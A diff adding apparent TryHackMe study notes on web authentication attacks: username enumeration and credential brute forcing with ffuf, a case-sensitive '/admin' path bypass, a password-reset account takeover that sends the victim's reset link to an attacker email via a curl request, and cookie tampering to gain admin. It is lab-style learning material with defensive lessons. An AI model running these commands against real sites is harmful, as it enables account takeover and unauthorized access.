@@ -306,3 +306,262 @@ To speed up the process of OSINT subdomain discovery, we can automate the above 
 ## Virtual Hosts
 
 
+
+
+#  Authentication & Cookie Exploitation Notes (TryHackMe)
+
+##  Overview
+
+This note covers common authentication vulnerabilities:
+
+* Username Enumeration
+* Brute Force Attacks
+* Logic Flaws
+* Cookie Manipulation (Plaintext, Hashing, Encoding)
+
+---
+
+#  1. Username Enumeration
+
+##  Concept
+
+Occurs when a website reveals whether a username exists.
+
+### Example:
+
+* Input: `admin`
+* Response: `Username already exists`
+
+ This confirms the username is valid.
+
+---
+
+##  Impact
+
+* Attackers can build a list of real users
+* Used for brute force attacks later
+
+---
+
+##  Tool: ffuf
+
+```bash
+ffuf -w names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u http://target/signup -mr "username already exists"
+```
+
+---
+
+#  2. Brute Force Attack
+
+##  Concept
+
+Trying many password combinations against known usernames.
+
+---
+
+##  Example Command
+
+```bash
+ffuf -w valid_usernames.txt:W1,passwords.txt:W2 \
+-X POST \
+-d "username=W1&password=W2" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u http://target/login \
+-fc 200
+```
+
+---
+
+##  Key Idea
+
+* W1 = usernames
+* W2 = passwords
+* Tries ALL combinations
+
+---
+
+#  3. Logic Flaws
+
+##  Concept
+
+Flaws in how the application processes logic.
+
+---
+
+##  Example
+
+```javascript
+if(url.substr(0,6) === '/admin') {
+    // check admin
+}
+```
+
+###  Vulnerability:
+
+* `/admin` → checked
+* `/adMin` → bypass
+
+---
+
+##  Impact
+
+* Access restricted pages without authentication
+
+---
+
+#  4. Password Reset Logic Flaw
+
+##  Concept
+
+Application mishandles GET and POST parameters.
+
+---
+
+##  Vulnerability
+
+Uses `$_REQUEST`:
+
+* Combines GET + POST
+* POST overrides GET
+
+---
+
+##  Exploit
+
+```bash
+curl 'http://target/reset?email=victim@email.com' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-d 'username=victim&email=attacker@email.com'
+```
+
+---
+
+##  Result
+
+* Account identified using victim email (GET)
+* Reset link sent to attacker email (POST)
+
+ Account takeover
+
+---
+
+#  5. Cookie Manipulation
+
+---
+
+##  Plain Text Cookies
+
+```http
+Set-Cookie: logged_in=true
+Set-Cookie: admin=false
+```
+
+###  Exploit:
+
+```bash
+Cookie: logged_in=true; admin=true
+```
+
+ Gain admin access
+
+---
+
+##  Hashing
+
+### Example:
+
+```
+MD5("1") = c4ca4238a0b923820dcc509a6f75849b
+```
+
+###  Weakness:
+
+* Can be cracked using hash databases
+* Same input → same output
+
+---
+
+##  Encoding (Base64)
+
+### Example Cookie:
+
+```http
+session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
+```
+
+###  Decoded:
+
+```json
+{"id":1,"admin": false}
+```
+
+---
+
+##  Exploit Steps
+
+1. Decode Base64
+2. Modify:
+
+```json
+{"id":1,"admin": true}
+```
+
+3. Re-encode
+4. Send request
+
+ Gain admin access
+
+---
+
+#  Key Security Lessons
+
+##  Bad Practices
+
+* Trusting client-side cookies
+* Revealing usernames via errors
+* Weak password policies
+* Mixing GET and POST data
+
+---
+
+##  Secure Practices
+
+* Validate everything server-side
+* Use secure session management
+* Hash + salt sensitive data
+* Avoid exposing system logic
+
+---
+
+#  Hacker Mindset
+
+Always ask:
+
+* Can I modify this input?
+* Does the server trust user data?
+* Can I bypass logic?
+* Are cookies readable or editable?
+
+---
+
+#  Summary
+
+| Vulnerability        | Method            | Impact               |
+| -------------------- | ----------------- | -------------------- |
+| Username Enumeration | Error messages    | Find valid users     |
+| Brute Force          | Password guessing | Account access       |
+| Logic Flaw           | Bypass logic      | Unauthorized access  |
+| Cookie Manipulation  | Modify cookies    | Privilege escalation |
+
+---
+
+##  End Goal
+
+Understand how systems fail so you can:
+
+* Exploit (ethical hacking)
+* Defend (secure coding)
+
+
